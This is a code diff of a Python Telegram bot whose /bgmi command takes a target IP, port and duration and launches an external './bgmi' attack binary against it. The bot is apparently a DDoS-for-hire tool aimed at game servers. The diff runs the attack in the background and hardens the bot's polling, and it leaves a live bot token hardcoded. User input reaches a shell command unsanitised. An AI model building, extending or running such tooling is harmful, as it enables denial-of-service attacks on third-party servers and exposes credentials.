@@ -5,7 +5,8 @@ import subprocess
 import datetime
 import os
 import time
-import signal
+import requests
+import random
 
 # Railway setup: keep_alive handles the port binding for web services
 try:
@@ -15,7 +16,8 @@ except ImportError:
     pass
 
 # Bot Token and Admin ID
-bot = telebot.TeleBot('8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE')
+TOKEN = '8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE'
+bot = telebot.TeleBot(TOKEN)
 admin_id = ["8787952549"]
 
 USER_FILE = "users.txt"
@@ -60,24 +62,14 @@ def handle_bgmi(message):
         cmd = message.text.split()
         if len(cmd) == 4:
             target, port, duration = cmd[1], cmd[2], cmd[3]
-            
-            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s\n\nBhai, thoda wait karo...")
-
+            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s")
             try:
-                # Give binary execution permission
                 os.system("chmod +x bgmi")
-                
-                # Execute attack binary
                 full_command = f"./bgmi {target} {port} {duration} 500"
-                result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
-                
-                if result.returncode == 0:
-                    bot.send_message(message.chat.id, f"✅ ATTACK FINISHED SUCCESSFULLY!\n🎯 Target: {target}")
-                else:
-                    bot.send_message(message.chat.id, f"⚠️ Attack finished with code {result.returncode}.\nError: {result.stderr[:100]}")
-            
+                subprocess.Popen(full_command, shell=True) # Non-blocking to avoid bot freezing
+                bot.send_message(message.chat.id, "✅ Attack running in background.")
             except Exception as e:
-                bot.send_message(message.chat.id, f"❌ Execution Error: {str(e)}")
+                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
         else:
             bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
     else:
@@ -85,35 +77,39 @@ def handle_bgmi(message):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!\n\nUse /help for commands.")
+    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!")
 
-@bot.message_handler(commands=['help'])
-def help_cmd(message):
-    bot.send_message(message.chat.id, "💥 /bgmi <ip> <port> <time>\n👤 /myinfo")
-
-# --- Polling Logic with Conflict Fix ---
-if __name__ == "__main__":
-    print("Railway Force Instance Cleaner Active...")
+# --- Polling Logic with Force Termination ---
+def run_bot():
+    print("Railway Instance Manager Starting...")
     
-    # Railway environment check: Initial cleanup
+    # Random delay 5-15 seconds to prevent race condition between old and new container
+    wait_time = random.randint(5, 15)
+    print(f"Waiting {wait_time}s to allow previous instance to shut down...")
+    time.sleep(wait_time)
+
+    # Forcefully clear webhook and drop all pending updates that cause loops
     try:
-        bot.remove_webhook()
-        time.sleep(5) # Give Telegram time to process the removal
-        print("Initial cleanup: Webhook/Connection cleared.")
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")
+        print("Telegram Session Reset: Success")
     except Exception as e:
-        print(f"Cleanup warning: {e}")
+        print(f"Session Reset Warning: {e}")
 
     while True:
         try:
-            print("Attempting to start polling...")
-            # interval=1 and timeout=20 is best for Railway stability
-            bot.polling(none_stop=True, skip_pending=True, interval=1, timeout=20)
+            print("Starting Bot Polling...")
+            # Interval added to keep the CPU usage and request rate steady
+            bot.polling(none_stop=True, skip_pending=True, interval=3, timeout=60)
         except Exception as e:
-            error_msg = str(e)
-            print(f"Polling Error: {error_msg}")
+            error_str = str(e)
+            print(f"Polling Error: {error_str}")
             
-            if "Conflict" in error_msg or "409" in error_msg:
-                print("CONFLICT DETECTED: Sleeping 20s to force connection drop...")
-                time.sleep(20)
+            if "Conflict" in error_str or "409" in error_str:
+                # If conflict happens, wait longer to let Railway kill the ghost process
+                print("CONFLICT: Waiting 25s for session expiry...")
+                time.sleep(25)
             else:
-                time.sleep(5)
+                time.sleep(10)
+
+if __name__ == "__main__":
+    run_bot()
